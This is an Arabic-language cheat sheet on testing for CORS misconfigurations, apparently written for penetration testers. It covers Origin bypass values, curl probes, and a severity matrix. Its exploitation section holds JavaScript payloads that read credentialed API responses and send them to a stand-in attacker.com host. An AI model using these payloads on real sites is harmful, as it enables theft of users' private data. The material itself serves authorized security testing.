<a id="-cors-misconfiguration-cheatsheet"></a>
# 🌍 ورقة مرجعية لأخطاء إعداد CORS

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Cross-Origin Resource Sharing
```

يعرض الشعار اختصار CORS، أي مشاركة الموارد بين الأصول.

---

<a id="-what-is-cors"></a>
## 🎯 ما هي CORS؟

تنظم **CORS**، أي مشاركة الموارد بين الأصول (Cross-Origin Resource Sharing)، السماح لشيفرة المتصفح بقراءة استجابات من أصل مختلف. قد تتيح أخطاء إعدادها كشف بيانات حساسة عبر الأصول.

---

<a id="-testing-cors"></a>
## 🔍 اختبار CORS

<a id="basic-test"></a>
### اختبار أساسي

> **توضيح للتحقق:** ترويسات متساهلة وحدها لا تثبت سرقة بيانات. يجب أن تكون الاستجابة قابلة للقراءة من الأصل الآخر وأن تتضمن بيانات حساسة؛ وقد تقيد سياسات ملفات تعريف الارتباط إرسال بيانات اعتماد المستخدم. لا يفرض curl قواعد CORS الخاصة بالمتصفح. [شرح MDN لـ CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS).
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# فحص ترويسات الاستجابة:
Access-Control-Allow-Origin: https://evil.com  # قد يشير إلى ثغرة؛ راجع شروط التحقق
Access-Control-Allow-Credentials: true         # قد يرفع الأثر عند توافر بيانات اعتماد قابلة للإرسال
```

<a id="test-payloads-origin-header"></a>
### قيم اختبار لترويسة Origin

القيم التالية مدخلات خام للاختبار، وليست كلها بالضرورة أصولًا يصدرها المتصفح. يلزم التمييز بين استجابة الخادم لسلسلة مصطنعة وقيمة Origin فعلية وفق نموذج المتصفح. [معيار Fetch](https://fetch.spec.whatwg.org/#origin-header).
```
# اختبار تجاوز التحقق من مطابقة الأصل
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# أصل بقيمة null
null

# نطاق فرعي
https://sub.target.com

# تغيير البروتوكول إلى HTTP
http://target.com
```

---

<a id="-exploitation"></a>
## 💉 اختبار الاستغلال

<a id="steal-data-with-credentials"></a>
### قراءة بيانات عبر أصل آخر مع بيانات الاعتماد
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // إرسال البيانات إلى خادم الاختبار الذي يتحكم فيه المختبر
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

<a id="fetch-api-version"></a>
### مثال باستخدام Fetch API

> **حد للمثال:** قد تفشل `btoa` إذا احتوى نص الاستجابة محارف خارج نطاق البايت الواحد؛ الأمثلة الأصلية لا تعالج هذه الحالة. أُبقيت الشيفرة كما وردت. [توثيق MDN لـ btoa](https://developer.mozilla.org/en-US/docs/Web/API/Window/btoa).
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

<a id="-vulnerability-matrix"></a>
## 📊 مصفوفة تقييم الإعدادات

> **تصحيح للتفسير:** مع وضع تضمين بيانات الاعتماد لا يسمح المتصفح بقراءة استجابة ACAO ذات القيمة `*`، حتى لو كانت ACAC تساوي `true`. تسميات الخطورة في الجدول من الأصل، ولا تعني أن كل انعكاس أو أصل `null` ثغرة حرجة تلقائيًا؛ الأثر مرتبط بالبيانات والصلاحيات وإمكانية الاستغلال. [معيار CORS وبيانات الاعتماد](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials).

|ترويسة ACAO|ACAC|الخطر|
|-------------|------|------|
|`*`|false|منخفض دون بيانات اعتماد بحسب الأصل|
|`*`|true|إعداد غير صالح بحسب وصف الأصل|
|أصل يتحكم فيه المهاجم|true|**حرج بحسب الأصل**|
|null|true|**مرتفع بحسب الأصل**|
|أصل منعكس من الطلب|true|**حرج بحسب الأصل**|

<a id="dangerous-patterns"></a>
### أنماط خطرة
```http
# يعكس أي قيمة Origin
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# يسمح بالأصل null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

<a id="-quick-checks"></a>
## 🛠️ فحوص سريعة

```bash
# أتمتة الفحص باستخدام curl
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

<a id="-resources"></a>
## 📚 الموارد

- [دليل PortSwigger حول CORS](https://portswigger.net/web-security/cors)
- [مرجع لاختبار إعدادات CORS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 اختبر أخطاء إعداد CORS!</b><br>
  <i>للاختبارات المصرح بها فقط!</i>
</p>
